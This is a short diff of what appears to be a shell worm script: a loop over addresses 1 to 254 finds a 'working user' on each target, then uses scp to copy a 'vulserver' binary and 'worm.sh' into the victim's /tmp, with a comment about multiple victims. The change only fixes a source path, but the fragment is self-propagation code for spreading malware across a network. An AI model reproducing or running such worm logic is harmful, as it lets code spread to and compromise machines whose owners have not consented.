@@ -30,7 +30,7 @@ for i in $(seq 1 254); do
                 echo "[+] Found working user: $USER"
 
                 # Copy files
-                scp /home/server/vulserver $USER@$TARGET:/tmp/vulserver #Change this to: scp /tmp/vulserver $USER@$TARGET:/tmp/vulserver for the final version
+                scp /tmp/vulserver $USER@$TARGET:/tmp/vulserver #Change this to: scp /tmp/vulserver $USER@$TARGET:/tmp/vulserver for the final version
                 scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh
 
                 # Count PORT in case of multiple victims
